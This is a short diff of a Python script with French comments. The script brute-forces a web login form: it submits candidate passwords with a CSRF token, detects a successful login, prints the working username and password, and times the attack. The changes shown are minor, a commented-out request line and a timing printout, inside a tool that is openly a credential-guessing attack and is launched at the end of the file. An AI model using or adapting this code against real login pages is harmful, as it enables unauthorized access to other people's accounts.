@@ -24,6 +24,7 @@ def try_password(password):
         'X-CSRFToken': csrf_token,
     }
     response = session.post(url, data=data, headers=headers)
+    #response = requests.post(url, data=data, headers=headers)
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
         return True
@@ -47,7 +48,8 @@ def brute_force_attack(max_length=999999):
                 end_time = time.time()  # Arrêter le chronomètre
                 print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                 return password  # Retourner le mot de passe trouvé et arrêter
-
+    end_time = time.time()  # Arrêter le chronomètre
+    print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
 # Lancer l'attaque par force brute
 found_password = brute_force_attack()
 
